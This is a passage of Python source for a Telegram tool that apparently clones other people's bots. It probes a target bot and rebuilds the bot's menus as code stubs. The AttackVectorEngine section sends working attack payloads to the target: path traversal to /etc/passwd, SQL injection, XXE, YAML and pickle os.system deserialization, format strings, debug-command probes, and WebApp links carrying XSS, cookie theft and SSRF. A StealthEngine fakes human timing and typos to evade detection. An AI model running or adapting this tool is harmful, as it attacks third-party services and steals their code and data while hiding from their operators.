            InlineKeyboardButton(text="📊 Stats", callback_data=f"session_stats_{session_id}"),
            InlineKeyboardButton(text="📝 Notes", callback_data=f"session_notes_{session_id}")
        )
        builder.row(
            InlineKeyboardButton(text="🔙 Main", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def leaks_menu(bot_id: Optional[int] = None) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="📄 Tracebacks", callback_data="leaks_tracebacks"),
            InlineKeyboardButton(text="📁 File Paths", callback_data="leaks_paths")
        )
        builder.row(
            InlineKeyboardButton(text="🔤 Code Snippets", callback_data="leaks_snippets"),
            InlineKeyboardButton(text="📊 All Fragments", callback_data="leaks_all")
        )
        if bot_id:
            builder.row(
                InlineKeyboardButton(text="🎯 For Current Bot", callback_data=f"leaks_bot_{bot_id}")
            )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()

# ============================================================================
# STEALTH ENGINE
# ============================================================================

class StealthEngine:
    """Advanced stealth mechanisms to avoid detection"""
    
    def __init__(self, user_id: int, level: str = "balanced"):
        self.user_id = user_id
        self.level = level
        self.config = STEALTH_LEVELS[level]
        self.action_timestamps = []
        self.last_action_time = datetime.now()
        self.consecutive_actions = 0
        self.session_token = str(uuid.uuid4())[:8]
        
    async def pre_send_delay(self, target_bot_id: int, from_state: str = "unknown", to_state: str = None):
        """Calculate and wait appropriate delay based on observed patterns"""
        
        try:
            # Get observed timing from database
            cursor = db.execute(
                """SELECT avg_delay, std_dev, min_delay, max_delay 
                   FROM timing_patterns 
                   WHERE target_bot_id = ? AND from_state = ? 
                   ORDER BY sample_count DESC LIMIT 1""",
                (target_bot_id, from_state)
            )
            result = cursor.fetchone()
            
            if result:
                avg_delay, std_dev, min_delay, max_delay = result
                # Generate delay with gaussian noise
                delay = random.gauss(avg_delay, max(std_dev * 0.3, 0.1))
                delay = max(min_delay * 0.8, min(delay, max_delay * 1.2))
            else:
                # No data yet, use reasonable defaults
                delay = random.uniform(0.3, 1.5)
            
            # Apply stealth level multiplier
            delay *= random.uniform(*self.config["delay_multiplier"])
            
            # Add jitter
            delay += random.uniform(*self.config["jitter_range"])
            
            # Rate limiting check
            await self._check_rate_limit()
            
            # Check for burst mode
            if self.consecutive_actions > 3 and random.random() < self.config["burst_probability"]:
                # Burst mode - send multiple actions quickly
                delay *= 0.3
            
            logger.debug(f"Stealth delay: {delay:.2f}s for user {self.user_id}")
            await asyncio.sleep(delay)
            
            self.last_action_time = datetime.now()
            self.consecutive_actions += 1
            
        except Exception as e:
            logger.error(f"Error in stealth delay: {e}")
            await asyncio.sleep(0.5)  # Fallback delay
    
    async def simulate_typing(self, bot: Bot, chat_id: int, text_length: int = None):
        """Realistic typing simulation"""
        try:
            if text_length:
                # Calculate typing time based on text length (human WPM ~200 chars/min)
                base_time = text_length / 200 * 60  # seconds
                variance = random.uniform(*self.config["typing_variance"])
                typing_time = base_time * variance
            else:
                typing_time = random.uniform(0.5, 2.0)
            
            # Add random pauses within typing
            if typing_time > 1.5:
                # Simulate thinking pause
                async with ChatActionSender.typing(bot=bot, chat_id=chat_id):
                    await asyncio.sleep(typing_time * 0.3)
                await asyncio.sleep(0.1)
                async with ChatActionSender.typing(bot=bot, chat_id=chat_id):
                    await asyncio.sleep(typing_time * 0.7)
            else:
                async with ChatActionSender.typing(bot=bot, chat_id=chat_id):
                    await asyncio.sleep(typing_time)
                    
        except Exception as e:
            logger.error(f"Error simulating typing: {e}")
    
    async def _check_rate_limit(self):
        """Ensure we don't exceed rate limits"""
        now = datetime.now()
        cutoff = now - timedelta(seconds=60)
        
        # Clean old actions
        self.action_timestamps = [ts for ts in self.action_timestamps if ts > cutoff]
        
        if len(self.action_timestamps) >= self.config["max_actions_per_min"]:
            wait_time = 60 - (now - self.action_timestamps[0]).total_seconds()
            if wait_time > 0:
                logger.info(f"Rate limiting: waiting {wait_time:.2f}s")
                await asyncio.sleep(wait_time)
        
        self.action_timestamps.append(now)
    
    def should_simulate_error(self) -> bool:
        """Occasionally simulate human-like mistakes"""
        return random.random() < self.config["human_error_prob"]
    
    def get_modified_text(self, original: str) -> str:
        """Slightly modify text to avoid fingerprinting (if safe to do so)"""
        if not self.should_simulate_error() or len(original) < 10:
            return original
        
        # Simulate typo (swap two characters)
        if random.random() < 0.3:
            pos = random.randint(1, len(original) - 2)
            chars = list(original)
            chars[pos], chars[pos + 1] = chars[pos + 1], chars[pos]
            return ''.join(chars)
        
        # Simulate capitalization error
        if random.random() < 0.2:
            words = original.split()
            if words:
                word_idx = random.randint(0, len(words) - 1)
                if len(words[word_idx]) > 1:
                    words[word_idx] = words[word_idx][0].lower() + words[word_idx][1:]
            return ' '.join(words)
        
        return original
    
    def reset(self):
        """Reset stealth engine state"""
        self.consecutive_actions = 0
        self.action_timestamps = []

# ============================================================================
# ATTACK VECTOR ENGINE
# ============================================================================

class AttackVectorEngine:
    """
    Advanced attack vectors to force code leakage
    Note: Success rate is low in 2026, but we try everything
    """
    
    def __init__(self, target_bot_id: int, target_username: str):
        self.target_bot_id = target_bot_id
        self.target_username = target_username
        self.discovered_fragments = []
        
    async def execute_all_vectors(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[Dict]:
        """Execute all attack vectors in sequence"""
        results = []
        
        vectors = [
            ("traceback", self.force_tracebacks),
            ("library", self.library_exploits),
            ("probe", self.probe_debug_commands),
            ("crash", self.trigger_crashes),
            ("webapp", self.webapp_exploits)
        ]
        
        for vector_name, vector_func in vectors:
            try:
                result = await vector_func(bot, message, stealth)
                results.append({
                    "vector": vector_name,
                    "success": bool(result),
                    "details": result
                })
                await asyncio.sleep(random.uniform(1, 3))  # Cooldown between vectors
            except Exception as e:
                logger.error(f"Error in vector {vector_name}: {e}")
                results.append({
                    "vector": vector_name,
                    "success": False,
                    "error": str(e)
                })
        
        return results
    
    async def force_tracebacks(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to force Python tracebacks that leak code"""
        tracebacks = []
        
        payloads = [
            "A" * 50000,
            "\uFFFF\uFFFE\uFFF9" * 1000,
            "[[[]]]" * 500,
            '{"__proto__": {"toString": {"__proto__": null}}}',
            "../../../etc/passwd\n" * 50,
            "%s" * 100 + "%n%n%n",
            "\u200B\u200C\u200D\u200E" * 500,
            "test\x00test\\u0000test",
            "(" * 500 + ")" * 500,
            "\x01\x02\x03\x04\x05\x06\x07" * 250,
            "9" * 1000 + "/0" + "9" * 1000,
            "' OR '1'='1; -- " * 20,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" * 10,
        ]
        
        for payload in payloads:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_traceback")
                await stealth.simulate_typing(bot, message.chat.id, len(payload))
                
                # Send to target
                await bot.send_message(
                    chat_id=f"@{self.target_username}",
                    text=payload
                )
                
                # Wait for potential response
                await asyncio.sleep(3)
                
            except Exception as e:
                # Sometimes errors themselves contain useful info
                error_str = str(e)
                if any(term in error_str.lower() for term in ['traceback', 'file "/', 'line ', 'error:', 'exception:']):
                    tracebacks.append(error_str)
                    db.add_code_fragment(
                        self.target_bot_id,
                        'traceback',
                        error_str,
                        source_vector='traceback_forcing',
                        confidence=0.6
                    )
        
        return tracebacks
    
    async def probe_debug_commands(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Probe for common debug/leak commands"""
        responses = []
        
        commands = [
            "/source", "/code", "/repo", "/github", "/debug",
            "/version", "/sysinfo", "/env", "/config", "/dump",
            "/eval", "/exec", "/shell", "/cmd", "/phpinfo",
            "/var_dump", "/print_r", "/reflect", "/inspect",
            "/getsource", "/locals", "/globals", "/stacktrace",
            "/backtrace", "/whoami", "/pwd", "/ls", "/dir",
            "/cat /etc/passwd", "/show config", "/view source",
            "/src", "/git", "/download", "/export", "/backup",
            "/.env", "/.git", "/.config", "/admin/debug",
            "/dev/test", "/staging/info", "/internal/status",
            "/easter_egg", "/secret_code", "/hidden_source",
            "/sudo ls", "/admin/phpinfo", "/debug/vars",
            "/debug/pprof/", "/metrics", "/healthz",
            "/?source", "/?debug=1", "/?show_code=1",
        ]
        
        for cmd in commands:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_probe")
                
                await bot.send_message(
                    chat_id=f"@{self.target_username}",
                    text=cmd
                )
                
                await asyncio.sleep(2)
                
            except Exception as e:
                logger.debug(f"Probe command {cmd} caused error: {e}")
        
        return responses
    
    async def library_exploits(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to exploit known library vulnerabilities"""
        exploits = []
        
        payloads = [
            str([[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]),
            '{"key": "\ud800"}',
            "!!python/object/apply:os.system ['echo vulnerable']",
            "cos\nsystem\n(S'echo vulnerable'\ntR.",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "'; DROP TABLE users; SELECT * FROM information_schema.tables; --",
            "AAAA" + "%n" * 10,
            "A" * 1000000 + "\x00\x01\x02\x03",
            "..%2f..%2f..%2fetc%2fpasswd",
            "../../../etc/passwd%00.jpg",
        ]
        
        for payload in payloads:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_library")
                
                await bot.send_message(
                    chat_id=f"@{self.target_username}",
                    text=f"/start exploit_test: {payload}"
                )
                
                await asyncio.sleep(3)
                
            except Exception as e:
                if hasattr(e, 'message'):
                    exploits.append(e.message)
        
        return exploits
    
    async def trigger_crashes(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to trigger crashes that might leak state"""
        crashes = []
        
        try:
            # Send very long callback data
            builder = InlineKeyboardBuilder()
            builder.button(text="Crash Test", callback_data="A" * 200)
            
            await stealth.pre_send_delay(self.target_bot_id, "attack_crash")
            
            await bot.send_message(
                chat_id=f"@{self.target_username}",
                text="Crash test 1",
                reply_markup=builder.as_markup()
            )
            
        except Exception as e:
            crashes.append(str(e))
        
        return crashes
    
    async def webapp_exploits(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to exploit WebApp vulnerabilities"""
        results = []
        
        webapp_payloads = [
            {"text": "XSS Test", "url": "javascript:alert('XSS')"},
            {"text": "Local File", "url": "file:///etc/passwd"},
            {"text": "Data URI", "url": "data:text/html,<script>document.write(document.cookie)</script>"},
            {"text": "SSRF Test", "url": "http://169.254.169.254/latest/meta-data/"},
            {"text": "SQL Test", "url": "javascript:fetch('/?id=1 UNION SELECT password FROM users')"},
        ]
        
        for payload in webapp_payloads:
            try:
                builder = InlineKeyboardBuilder()
                builder.button(
                    text=payload["text"],
                    web_app=types.WebAppInfo(url=payload["url"])
                )
                
                await stealth.pre_send_delay(self.target_bot_id, "attack_webapp")
                
                await bot.send_message(
                    chat_id=message.chat.id,
                    text=f"Testing WebApp vector for @{self.target_username}\nClick to attempt exploit:",
                    reply_markup=builder.as_markup()
                )
                
                results.append(f"Sent WebApp: {payload['text']}")
                
            except Exception as e:
                logger.error(f"WebApp exploit error: {e}")
        
        return results

# ============================================================================
# MESSAGE PROCESSOR
# ============================================================================

class MessageProcessor:
    """Process and analyze messages from target bot"""
    
    def __init__(self, target_bot_id: int):
        self.target_bot_id = target_bot_id
        self.message_cache = {}
        self.patterns_detected = set()
        self.state_memory = {}
        
    async def process_response(self, message: types.Message, original_message_id: int = None) -> Dict:
        """Process and analyze a response from target bot"""
        analysis = {
            "type": message.content_type,
            "has_text": bool(message.text),
            "has_caption": bool(message.caption),
            "has_media": bool(message.photo or message.video or message.document or message.audio or message.voice),
            "has_buttons": bool(message.reply_markup and message.reply_markup.inline_keyboard),
            "has_entities": bool(message.entities or message.caption_entities),
            "has_reply": bool(message.reply_to_message),
            "variables": [],
            "state_info": None,
            "raw_data": message.model_dump(exclude_none=True),
            "timestamp": datetime.now().isoformat()
        }
        
        # Extract text content
        text_content = message.text or message.caption or ""
        if text_content:
            analysis["text"] = text_content
            analysis["text_length"] = len(text_content)
            
            # Check for variable patterns
            patterns = db.detect_patterns(self.target_bot_id, text_content)
            analysis["patterns"] = patterns
            
            # Try to detect message type
            analysis["message_type"] = self._detect_message_type(text_content)
        
        # Analyze buttons
        if message.reply_markup and message.reply_markup.inline_keyboard:
            buttons = []
            callback_data_list = []
            
            for row in message.reply_markup.inline_keyboard:
                for button in row:
                    button_info = {
                        "text": button.text,
                        "type": "callback" if button.callback_data else "url" if button.url else "webapp" if button.web_app else "unknown"
                    }
                    if button.callback_data:
                        button_info["callback_data"] = button.callback_data
                        button_info["callback_hash"] = hashlib.md5(button.callback_data.encode()).hexdigest()
                        callback_data_list.append(button.callback_data)
                    if button.url:
                        button_info["url"] = button.url
                    if button.web_app:
                        button_info["web_app"] = button.web_app.url
                    buttons.append(button_info)
            
            analysis["buttons"] = buttons
            analysis["callback_data_list"] = callback_data_list
            
            # Detect state from button pattern
            analysis["state_info"] = self._detect_state_from_buttons(buttons, text_content)
        
        # Handle media
        if message.photo:
            analysis["photo"] = message.photo[-1].file_id
            analysis["photo_size"] = message.photo[-1].file_size
            analysis["photo_unique_id"] = message.photo[-1].file_unique_id
        if message.video:
            analysis["video"] = message.video.file_id
            analysis["video_unique_id"] = message.video.file_unique_id
        if message.document:
            analysis["document"] = message.document.file_id
            analysis["document_name"] = message.document.file_name
            analysis["mime_type"] = message.document.mime_type
        if message.audio:
            analysis["audio"] = message.audio.file_id
            analysis["audio_title"] = message.audio.title
        if message.voice:
            analysis["voice"] = message.voice.file_id
        if message.sticker:
            analysis["sticker"] = message.sticker.file_id
            analysis["sticker_set"] = message.sticker.set_name
        if message.animation:
            analysis["animation"] = message.animation.file_id
        
        # Handle polls
        if message.poll:
            analysis["poll"] = {
                "question": message.poll.question,
                "options": [opt.text for opt in message.poll.options],
                "is_anonymous": message.poll.is_anonymous,
                "type": message.poll.type,
                "allows_multiple_answers": message.poll.allows_multiple_answers
            }
        
        # Handle dice
        if message.dice:
            analysis["dice"] = {
                "emoji": message.dice.emoji,
                "value": message.dice.value
            }
        
        # Handle location
        if message.location:
            analysis["location"] = {
                "latitude": message.location.latitude,
                "longitude": message.location.longitude
            }
        
        # Handle venue
        if message.venue:
            analysis["venue"] = {
                "title": message.venue.title,
                "address": message.venue.address,
                "latitude": message.venue.location.latitude,
                "longitude": message.venue.location.longitude
            }
        
        # Handle contact
        if message.contact:
            analysis["contact"] = {
                "phone_number": message.contact.phone_number,
                "first_name": message.contact.first_name,
                "user_id": message.contact.user_id
            }
        
        # Check for edit/delete patterns
        if message.edit_date:
            analysis["edited"] = True
            analysis["edit_date"] = message.edit_date
        
        return analysis
    
    def _detect_state_from_buttons(self, buttons: List[Dict], text: str = "") -> Dict:
        """Attempt to detect state/menu from button layout"""
        state_info = {
            "type": "menu",
            "has_back": any(b["text"].lower() in ["back", "◀️", "⬅️", "←", "返回", "назад"] for b in buttons),
            "has_next": any(b["text"].lower() in ["next", "▶️", "➡️", "→", "继续", "далее"] for b in buttons),
            "has_cancel": any(b["text"].lower() in ["cancel", "❌", "отмена", "取消"] for b in buttons),
            "has_confirm": any(b["text"].lower() in ["yes", "✅", "confirm", "ok", "да"] for b in buttons),
            "button_count": len(buttons),
            "button_types": list(set(b.get("type", "unknown") for b in buttons)),
            "callback_patterns": []
        }
        
        # Detect pagination
        if state_info["has_back"] and state_info["has_next"]:
            state_info["type"] = "pagination_menu"
            
            # Look for page numbers in text
            page_pattern = r'page\s*(\d+)|(\d+)\s*/\s*(\d+)|страница\s*(\d+)'
            if re.search(page_pattern, text, re.IGNORECASE):
                state_info["type"] = "numbered_pagination"
            
            # Look for page numbers in buttons
            for b in buttons:
                if re.search(r'\d+', b["text"]) and len(b["text"]) < 5:
                    state_info["type"] = "numbered_pagination"
                    break
        
        # Detect confirmation dialogs
        if state_info["has_confirm"] and state_info["has_cancel"]:
            state_info["type"] = "confirmation_dialog"
        elif state_info["has_confirm"] and not state_info["has_cancel"]:
            state_info["type"] = "single_confirm"
        
        # Detect selection menu
        if len(buttons) > 3 and not state_info["has_back"] and not state_info["has_next"]:
            if all(b["type"] == "callback" for b in buttons):
                state_info["type"] = "selection_menu"
        
        # Detect form input
        if not buttons and "send" in text.lower() and any(x in text.lower() for x in ["enter", "input", "type"]):
            state_info["type"] = "input_form"
        
        # Detect main menu (usually has diverse options)
        if len(buttons) >= 4 and len(buttons) <= 8 and any("main" in b["text"].lower() for b in buttons):
            state_info["type"] = "main_menu"
        
        return state_info
    
    def _detect_message_type(self, text: str) -> str:
        """Detect type of message based on content"""
        text_lower = text.lower()
        
        # Greeting patterns
        if any(greeting in text_lower for greeting in ["welcome", "hello", "hi", "привет", "start"]):
            return "greeting"
        
        # Error patterns
        if any(error in text_lower for error in ["error", "exception", "traceback", "failed", "invalid"]):
            return "error"
        
        # Information patterns
        if any(info in text_lower for info in ["info", "information", "details", "about"]):
            return "information"
        
        # Confirmation patterns
        if any(conf in text_lower for conf in ["confirm", "verified", "success", "completed"]):
            return "confirmation"
        
        # Question patterns
        if "?" in text or any(q in text_lower for q in ["what", "where", "when", "why", "how", "who"]):
            return "question"
        
        # List patterns
        if any(list_word in text_lower for list_word in ["list", "options", "choose", "select"]):
            return "list"
        
        return "general"
    
    def detect_dynamic_content(self, messages: List[str]) -> List[Dict]:
        """Detect which parts of messages are dynamic"""
        if len(messages) < 3:
            return []
        
        variables = []
        
        # Use SequenceMatcher to find variable parts
        for i in range(len(messages) - 1):
            matcher = difflib.SequenceMatcher(None, messages[i], messages[i + 1])
            
            for tag, i1, i2, j1, j2 in matcher.get_opcodes():
                if tag in ('replace', 'delete', 'insert'):
                    # This is a variable part
                    var_part = messages[i][i1:i2] if tag == 'replace' or tag == 'delete' else messages[i + 1][j1:j2]
                    
                    # Skip if too short
                    if len(var_part) < 3:
                        continue
                    
                    # Try to determine variable type
                    var_type = self._identify_variable_type(var_part)
                    
                    variables.append({
                        "text": var_part,
                        "type": var_type,
                        "position": i1,
                        "length": i2 - i1,
                        "examples": [messages[i][i1:i2], messages[i + 1][j1:j2]]
                    })
        
        return variables
    
    def _identify_variable_type(self, text: str) -> str:
        """Identify likely type of variable"""
        # Number patterns
        if re.match(r'^\d+$', text):
            return "number"
        if re.match(r'^\d+\.\d+$', text):
            return "decimal"
        
        # Date patterns
        if re.match(r'\d{1,4}[/\-\.]\d{1,2}[/\-\.]\d{1,4}', text):
            return "date"
        
        # Time patterns
        if re.match(r'\d{1,2}:\d{2}(?::\d{2})?', text):
            return "time"
        
        # Email patterns
        if re.match(r'^[^@]+@[^@]+\.[^@]+$', text):
            return "email"
        
        # Username patterns
        if re.match(r'^@\w+$', text):
            return "username"
        
        # ID patterns (alphanumeric)
        if re.match(r'^[A-Z0-9]{5,}$', text, re.IGNORECASE):
            return "id"
        
        # Currency patterns
        if re.match(r'^[\$\€\£\¥]\d+', text):
            return "price"
        
        return "text"

# ============================================================================
# STATE MACHINE RECONSTRUCTOR
# ============================================================================

class StateMachineReconstructor:
    """Reconstruct FSM from observed interactions"""
    
    def __init__(self, target_bot_id: int):
        self.target_bot_id = target_bot_id
        self.states: Dict[str, BotState] = {}
        self.transitions: List[Dict] = []
        self.entry_points: Set[str] = set()
        
    async def rebuild_from_history(self) -> Dict:
        """Rebuild FSM from database history"""
        try:
            # Get all button flows
            cursor = db.execute(
                """SELECT from_state, button_text, button_callback_data, to_state, frequency, confidence 
                   FROM button_flows WHERE target_bot_id = ? ORDER BY frequency DESC""",
                (self.target_bot_id,)
            )
            flows = cursor.fetchall()
            
            # Process flows to build state graph
            for flow in flows:
                from_state, btn_text, btn_cb, to_state, freq, conf = flow
                
                # Sanitize state names
                from_state = from_state or "unknown"
                to_state = to_state or "unknown"
                
                # Add states
                if from_state not in self.states:
                    self.states[from_state] = BotState(
                        name=from_state,
                        description=f"State with {freq} observations",
                        confidence=conf or 0.5
                    )
                
                if to_state not in self.states and to_state != "unknown":
                    self.states[to_state] = BotState(
                        name=to_state,
                        description=f"Destination state",
                        confidence=conf or 0.5
                    )
                
                # Add button to from_state
                button_info = {
                    "text": btn_text,
                    "callback_data": btn_cb,
                    "leads_to": to_state,
                    "frequency": freq
                }
                
                if button_info not in self.states[from_state].buttons:
                    self.states[from_state].buttons.append(button_info)
                
                # Add transition
                self.transitions.append({
                    "from": from_state,
                    "to": to_state,
                    "trigger": btn_text,
                    "callback": btn_cb,
                    "frequency": freq,
                    "confidence": conf
                })
                
                # Build relationship
                if to_state != "unknown":
                    if to_state not in self.states[from_state].child_states:
                        self.states[from_state].child_states.append(to_state)
                    
                    if from_state not in self.states[to_state].parent_state:
                        self.states[to_state].parent_state = from_state
            
            # Identify entry points (states with no parents or /start)
            for state_name, state in self.states.items():
                if not state.parent_state or "start" in state_name.lower():
                    self.entry_points.add(state_name)
                    state.entry_points.append("/start")
            
            # Try to identify message patterns for each state
            await self._enrich_states_with_messages()
            
            return {
                "states": list(self.states.keys()),
                "state_details": {name: asdict(state) for name, state in self.states.items()},
                "transitions": self.transitions,
                "entry_points": list(self.entry_points),
                "state_count": len(self.states),
                "transition_count": len(self.transitions),
                "complexity_score": self._calculate_complexity()
            }
            
        except Exception as e:
            logger.error(f"Error rebuilding FSM: {e}")
            return {"error": str(e)}
    
    async def _enrich_states_with_messages(self):
        """Add message patterns to states based on interactions"""
        try:
            cursor = db.execute(
                """SELECT raw_data FROM interactions 
                   WHERE target_bot_id = ? AND direction = 'target_to_user'
                   ORDER BY timestamp DESC LIMIT 1000""",
                (self.target_bot_id,)
            )
            
            for row in cursor.fetchall():
                try:
                    raw_data = json.loads(row[0])
                    text = raw_data.get('text') or raw_data.get('caption', '')
                    
                    if not text:
                        continue
                    
                    # Try to match to a state based on button patterns or content
                    best_match = None
                    best_score = 0
                    
                    for state_name, state in self.states.items():
                        # Check if message contains button texts from this state
                        button_texts = [b.get('text', '') for b in state.buttons]
                        if button_texts and any(btn_text in text for btn_text in button_texts):
                            score = sum(1 for btn in button_texts if btn in text) / len(button_texts)
                            if score > best_score:
                                best_score = score
                                best_match = state_name
                    
                    if best_match and best_score > 0.3:
                        if text not in self.states[best_match].message_patterns:
                            self.states[best_match].message_patterns.append(text[:100])
                            self.states[best_match].last_seen = datetime.now()
                            self.states[best_match].visit_count += 1
                
                except Exception:
                    continue
                    
        except Exception as e:
            logger.error(f"Error enriching states: {e}")
    
    def _calculate_complexity(self) -> float:
        """Calculate bot complexity score"""
        if not self.states:
            return 0.0
        
        # Factors: number of states, transitions per state, unique buttons
        num_states = len(self.states)
        if num_states == 0:
            return 0.0
        
        avg_transitions = len(self.transitions) / num_states
        
        # Count unique button texts
        unique_buttons = len(set(
            btn.get("text", "") for state in self.states.values() 
            for btn in state.buttons
        ))
        
        # Calculate depth (max chain length)
        max_depth = 0
        for entry in self.entry_points:
            depth = self._calculate_depth(entry, set())
            max_depth = max(max_depth, depth)
        
        # Normalize scores
        state_score = min(1.0, num_states / 50)
        transition_score = min(1.0, avg_transitions / 10)
        button_score = min(1.0, unique_buttons / 100)
        depth_score = min(1.0, max_depth / 20)
        
        weights = [0.3, 0.25, 0.25, 0.2]
        scores = [state_score, transition_score, button_score, depth_score]
        
        complexity = sum(w * s for w, s in zip(weights, scores))
        return round(complexity, 3)
    
    def _calculate_depth(self, state_name: str, visited: Set[str]) -> int:
        """Calculate maximum depth from a state"""
        if state_name not in self.states or state_name in visited:
            return 0
        
        visited.add(state_name)
        max_child_depth = 0
        
        for child in self.states[state_name].child_states:
            if child not in visited:
                depth = self._calculate_depth(child, visited.copy())
                max_child_depth = max(max_child_depth, depth)
        
        return 1 + max_child_depth
    
    def generate_mermaid_diagram(self) -> str:
        """Generate Mermaid flowchart from reconstructed states"""
        if not self.states:
            return "graph TD\n    Start[No states detected]"
        
        diagram = ["graph TD"]
        
        # Add style definitions
        diagram.append("    classDef entry fill:#9f9,stroke:#333,stroke-width:2px;")
        diagram.append("    classDef unknown fill:#f99,stroke:#333,stroke-width:1px;")
        diagram.append("")
        
        # Add states as nodes
        for state_name, state in self.states.items():
            # Sanitize state name for Mermaid
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', state_name)
            
            # Escape special characters
            display_name = state_name.replace('"', '\\"')
            
            # Add node with appropriate class
            node_def = f'    {safe_name}["{display_name}"]'
            if state_name in self.entry_points:
                node_def += ":::entry"
            elif state_name == "unknown":
                node_def += ":::unknown"
            
            diagram.append(node_def)
        
        diagram.append("")
        
        # Add transitions
        for trans in self.transitions:
            from_safe = re.sub(r'[^a-zA-Z0-9]', '_', trans["from"])
            to_safe = re.sub(r'[^a-zA-Z0-9]', '_', trans["to"])
            
            # Escape special characters in label
            label = trans["trigger"].replace('"', '\\"')
            if len(label) > 20:
                label = label[:17] + "..."
            
            # Add frequency indicator for important paths
            if trans.get("frequency", 0) > 5:
                diagram.append(f'    {from_safe} ==o "{label}" ==> {to_safe}')
            else:
                diagram.append(f'    {from_safe} -->|"{label}"| {to_safe}')
        
        # Add start node
        if self.entry_points:
            diagram.append("")
            diagram.append("    Start([Start]) --> " + 
                          " & ".join([re.sub(r'[^a-zA-Z0-9]', '_', e) for e in self.entry_points]))
        
        return "\n".join(diagram)
    
    def generate_python_stubs(self) -> str:
        """Generate Python code stubs for the reconstructed FSM"""
        stubs = [
            "#!/usr/bin/env python3",
            "# -*- coding: utf-8 -*-",
            "\"\"\"",
            "AUTO-GENERATED FSM STUBS FROM BOT CLONE v3.0",
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Target Bot ID: {self.target_bot_id}",
            f"States Detected: {len(self.states)}",
            f"Transitions: {len(self.transitions)}",
            f"Confidence Score: {self._calculate_complexity()}",
            "\"\"\"",
            "",
            "from aiogram import Bot, Dispatcher, types, F, Router",
            "from aiogram.filters import Command, StateFilter",
            "from aiogram.fsm.context import FSMContext",
            "from aiogram.fsm.state import State, StatesGroup",
            "from aiogram.fsm.storage.memory import MemoryStorage",
            "from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton",
            "from aiogram.utils.keyboard import InlineKeyboardBuilder",
            "",
            "# =====================================================================",
            "# RECONSTRUCTED STATES",
            "# =====================================================================",
            ""
        ]
        
        # Generate StatesGroup with all detected states
        stubs.append("class BotStates(StatesGroup):")
        
        # Add entry point first
        stubs.append("    # Entry Points")
        for entry in self.entry_points:
            safe_name = entry.upper().replace(" ", "_").replace("-", "_")
            if not safe_name:
                continue
            stubs.append(f"    {safe_name} = State()  # Entry: {entry}")
        
        stubs.append("")
        stubs.append("    # Detected States")
        for state_name in self.states:
            if state_name in self.entry_points or state_name == "unknown":
                continue
            safe_name = state_name.upper().replace(" ", "_").replace("-", "_")
            if not safe_name:
                continue
            desc = self.states[state_name].description
            stubs.append(f"    {safe_name} = State()  # {desc}")
        
        stubs.append("")
        stubs.append("# =====================================================================")
        stubs.append("# RECONSTRUCTED BUTTONS & KEYBOARDS")
        stubs.append("# =====================================================================")
        stubs.append("")
        
        # Generate keyboard builders for each state
        for state_name, state in self.states.items():
            if not state.buttons:
                continue
            
            safe_name = state_name.upper().replace(" ", "_").replace("-", "_")
            stubs.append(f"def get_{safe_name.lower()}_keyboard() -> InlineKeyboardMarkup:")
            stubs.append(f'    """Generate keyboard for {state_name} state"""')
            stubs.append("    builder = InlineKeyboardBuilder()")
            
            # Group buttons into rows (assume 2 per row for typical layout)
            for i, button in enumerate(state.buttons):
                text = button.get('text', 'Button')
                callback = button.get('callback_data', f'{state_name.lower()}_action_{i}')
                
                if i % 2 == 0:
                    stubs.append("    builder.row(")
                
                stubs.append(f'        InlineKeyboardButton(text="{text}", callback_data="{callback}"),')
                
                if i % 2 == 1 or i == len(state.buttons) - 1:
                    stubs.append("    )")
            
            stubs.append("    return builder.as_markup()")
            stubs.append("")
        
        stubs.append("# =====================================================================")
        stubs.append("# HANDLERS (RECONSTRUCTED FLOWS)")
        stubs.append("# =====================================================================")
        stubs.append("")
        stubs.append("router = Router()")
        stubs.append("")
        
        # Generate entry point handlers
        stubs.append("# Entry Point Handlers")
        stubs.append("@router.message(CommandStart())")
        stubs.append("async def cmd_start(message: types.Message, state: FSMContext):")
        stubs.append('    """Handle /start command"""')
        
        if self.entry_points:
            first_entry = list(self.entry_points)[0]
            safe_entry = first_entry.upper().replace(" ", "_").replace("-", "_")
            stubs.append(f'    await state.set_state(BotStates.{safe_entry})')
        else:
            stubs.append('    # TODO: Set initial state')
        
        stubs.append('    await message.answer(')
        stubs.append('        "Welcome! I am a cloned bot.",')
        stubs.append('        reply_markup=get_main_menu_keyboard()  # TODO: Implement')
        stubs.append('    )')
        stubs.append("")
        
        # Generate handlers for each transition
        stubs.append("# State Transition Handlers")
        for trans in self.transitions:
            if trans["from"] == "unknown" or trans["to"] == "unknown":
                continue
            
            from_safe = trans["from"].upper().replace(" ", "_").replace("-", "_")
            to_safe = trans["to"].upper().replace(" ", "_").replace("-", "_")
            
            # Create handler name
            handler_name = f"handle_{trans['from'].lower().replace(' ', '_')}_to_{trans['to'].lower().replace(' ', '_')}"
            
            stubs.append(f"@router.callback_query(StateFilter(BotStates.{from_safe}), F.data == \"{trans['callback']}\")")
            stubs.append(f"async def {handler_name}(callback: types.CallbackQuery, state: FSMContext):")
            stubs.append(f'    """Handle {trans["trigger"]} button - leads to {trans["to"]}"""')
            stubs.append("    # TODO: Add your business logic here")
            stubs.append(f"    await state.set_state(BotStates.{to_safe})")
            stubs.append("    await callback.answer()")
            stubs.append("")
        
        # Add utility functions
        stubs.append("# =====================================================================")
        stubs.append("# UTILITY FUNCTIONS")
        stubs.append("# =====================================================================")
        stubs.append("")
